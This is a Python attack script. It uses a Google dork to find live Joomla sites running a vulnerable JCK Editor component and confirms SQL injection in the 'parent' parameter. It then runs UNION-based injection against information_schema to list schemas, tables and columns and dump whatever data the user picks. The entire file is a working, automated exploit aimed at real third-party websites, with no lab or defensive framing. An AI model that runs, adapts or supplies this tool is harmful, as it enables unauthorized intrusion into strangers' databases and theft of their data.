import sys
import re
import time
import urllib
import urllib.request
from googlesearch import search     #pip install google

pages = []

# # search pages that have vulnerable component
query = "inurl:plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?"

print("Searching for pages with vulnerable Joomla Component...")

results = search(query, tld="co.in", num=5, stop=5, pause=2) #search(query to search, top level domain, number of results we want, last result to retrieve, lapse to wait between HTTP requests) lapse too short may cause Google to block IP

for j in results:
    x = re.split("links.php?", j)
    #add vulnerable parameters to the url found
    fullurl = x[0]+"links.php?extension=menu&view=menu&parent="
    #print page found
    print("\n" + "Page: " + x[0])
    #check if vulnerable: if when " added the page returns an SQL error, then it is vulnerable
    try:
        resp = urllib.request.urlopen(fullurl + '"')  
    except Exception as e:
        if str(e.read()).find("error in your SQL syntax") != -1:
            print ("The website is SQL injection vulnerable")
            print("Vulnerable variable: parent")
            pages.append(fullurl)
    else:
        print ("The website is NOT SQL injection vulnerable")
        
exit = "n"
while exit == "n":
    print("\n")
    for i in range (0, len(pages)):
        x = re.split("/plugins", pages[i])
        print(str(i) + "-->" + x[0])

    page = input("Select the vulnerable page to inject: ")
    target = pages[int(page)] #target holds the page to inject

    #check the number of columns that the sql query selects
    print("\n" + "Checking the number of columns the query selects...")
    columnNumber=1
    bool=1
    while bool == 1:
        try:
            resp = urllib.request.urlopen(target + '%22%20ORDER%20BY%20' + str(columnNumber) +'--%20aa')  
        except Exception as e:
            bool=0
            columnNumber=columnNumber-1
        else:
            columnNumber=columnNumber+1
            
    print("The query retrieves " + str(columnNumber) + " columns")

    #check what columns are printed on screen in order to see the results of the queries
    print("\n" + "Checking the columns that are printed on the page...")
    columns = "11"
    printedColumns = []
    for i in range(2, columnNumber+1):
        columns = columns + "," + str(i) + str(i)
    try:
        resp = urllib.request.urlopen(target + '%22%20UNION%20SELECT%20' + columns +'--%20aa')
        page = resp.read()
        for i in range(1,columnNumber+1):
            column = str(i) + str(i)
            if str(page).find(column) != -1:
                printedColumns.append(i)
    except Exception as e:
        print("Resources not accessible try with another page")
    else:
        exit = "y"
        print("The printed columns are: ")
        print(printedColumns)


#split the result string of the queries in order to access them later
columns = ""
for i in range (1, columnNumber+1):
    if columns == "":
        columns = columns + "12345"
    else:
        columns = columns + "," + "12345"
try:
    resp = urllib.request.urlopen(target + '%22%20UNION%20SELECT%20' + columns +'--%20aa')
    page = resp.read()
    parts = re.split("12345", str(page))
    parts[0] = parts[0].rsplit('<node ')[1]
except Exception as e:
    print(e.msg)
    print("Resources not accessible try with another page")
    exit()
    
#get schemas in database
columns=""
for i in range (1, columnNumber+1):
    if i==printedColumns[0]:
        if columns == "":
            columns = columns + "TABLE_SCHEMA"
        else:
            columns = columns + "," + "TABLE_SCHEMA"
    else:
        if columns == "":
            columns = columns + str(i)
        else:
            columns = columns + "," + str(i)

try:
    resp = urllib.request.urlopen(target + '%22%20UNION%20SELECT%20' + columns + '%20FROM%20information_schema.tables--%20aa')
    page = resp.read()
except Exception as e:
    print(e.msg)
    print("Resources not accessible try with another page")
    exit()
    
s=str(page)

x = s.split(parts[0])
del x[0]
schemas=[]

for i in x:
    schemas.append(i.split(parts[1])[0])

loop = 'y'  ##access database until the user decides to exit

while(loop == 'y'):

    print("\n" + "The schemas in the database are:")
    for i in range (0, len(schemas)):
        print(str(i) + "-->" + schemas[i])
        
    index = input("Select the schema to access: ")

    schema = schemas[int(index)]    #stores schema to access

    #access tables in schema
    columns=""
    for i in range (1, columnNumber+1):
        if i==printedColumns[0]:
            if columns == "":
                columns = columns + "TABLE_NAME"
            else:
                columns = columns + "," + "TABLE_NAME"
        else:
            if columns == "":
                columns = columns + str(i)
            else:
                columns = columns + "," + str(i)
                

    try:
        resp = urllib.request.urlopen(target + '%22%20UNION%20SELECT%20' + columns + '%20FROM%20information_schema.tables%20WHERE%20TABLE_SCHEMA%20=%20%27' + schema + '%27--%20aa')
        page = resp.read()
    except Exception as e:
        print(e.msg)
        print("Resources not accessible try with another page")
        exit()
        

    s=str(page)

    x = s.split(parts[0])
    del x[0]
    tables=[]

    for i in x:
        tables.append(i.split(parts[1])[0])
    
    if len(tables)== 0:
        print("No tables present")
    else:

        print("\n" + "The tables in the schema are:")

        for i in range (0, len(tables)):
            print(str(i) + "-->" + tables[i])
            
        index = input("Select the table to access: ")

        table = tables[int(index)]  #stores table to access


        #get columns in table
        columns=""
        for i in range (1, columnNumber+1):
            if i==printedColumns[0]:
                if columns == "":
                    columns = columns + "COLUMN_NAME"
                else:
                    columns = columns + "," + "COLUMN_NAME"
            else:
                if columns == "":
                    columns = columns + str(i)
                else:
                    columns = columns + "," + str(i)
                    

        try:
            resp = urllib.request.urlopen(target + '%22%20UNION%20SELECT%20' + columns + '%20FROM%20information_schema.columns%20WHERE%20TABLE_NAME%20=%20%27' + table + '%27--%20aa')
            page = resp.read()
        except Exception as e:
            print(e.msg)
            print("Resources not accessible try with another page")
            exit()

        s=str(page)

        x = s.split(parts[0])
        del x[0]
        tableColumns=[]

        for i in x:
            tableColumns.append(i.split(parts[1])[0])

        if len(tableColumns)== 0:
            print("No columns present")
        else:
            print("\n" + "The columns in the table are:")

            for i in range (0, len(tableColumns)):
                print(str(i) + "-->" + tableColumns[i])
                
            index = input("Select the column to access: ")

            tableColumn = tableColumns[int(index)]

            #get data in selected column
            columns=""
            for i in range (1, columnNumber+1):
                if i==printedColumns[0]:
                    if columns == "":
                        columns = columns + tableColumn
                    else:
                        columns = columns + "," + tableColumn
                else:
                    if columns == "":
                        columns = columns + str(i)
                    else:
                        columns = columns + "," + str(i)
                        

            try:
                resp = urllib.request.urlopen(target + '%22%20UNION%20SELECT%20' + columns + '%20FROM%20' + table + '--%20aa')
                page = resp.read()
            except Exception as e:
                print(e.msg)
                print("Resources not accessible try with another page")
                exit()

            s=str(page)

            x = s.split(parts[0])
            del x[0]
            data=[]

            for i in x:
                data.append(i.split(parts[1])[0])

            if len(data)!=0:
                print("\n" + "The " + tableColumn + " in the column are:")
                for i in range (0, len(data)):
                    print(str(i) + " - " + data[i])
            else:
                print("No data present")

    loop = input("Do you want to search for other data? (y/n)")
    
